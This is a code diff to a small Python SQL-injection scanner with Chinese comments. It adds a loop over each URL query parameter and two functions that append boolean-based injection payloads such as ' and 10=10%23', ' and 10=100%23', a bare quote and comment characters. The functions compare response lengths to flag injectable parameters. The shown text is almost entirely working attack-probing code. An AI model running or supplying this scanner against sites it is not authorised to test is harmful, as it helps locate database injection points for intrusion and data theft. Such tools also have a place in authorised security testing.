@@ -13,26 +13,36 @@ def Scan(url):
     if 'http' not in url:
         url = 'http://' + url
     params = url.split('?')[1].split('&')
-
     origin = len(requests.get(url,timeout=0.5).text)
+    for i in params:
+        if sqlTrue(url,origin,i):
+            if sqlFalse(url,origin,i):
+                print('[!!] Find Injection：'+ url+' Param: '+i)
+
 
 #输出正常的SQL注入语句
-def sqlTrue(url,origin):
-    payload = [' and 10=10','%23','%0A',]
+def sqlTrue(url,origin,param):
+    payload = [' and 10=10%23','%23','%0A','\'%23']
     error_count = 0
     for i in payload:
-        length = len(requests.get(url+i,timeout=0.5).text)
+        length = len(requests.get(url.replace(param,param+i),timeout=0.5).text)
         if length != origin:
             error_count += 1
     if error_count == 3:
         return 0
+    return 1
 
 #输出错误的SQL注入语句
-def sqlFalse(url,origin):
-    payload = ['a',]
-
-
-
+def sqlFalse(url,origin,param):
+    payload = ['a',' and 10=100%23','\'']
+    error_count = 0
+    for i in payload:
+        length = len(requests.get(url.replace(param,param+i),timeout=0.5).text)
+        if length == origin:
+            error_count += 1
+    if error_count == 3:
+        return 0
+    return 1
 
 #输出提示信息
 def Usage():
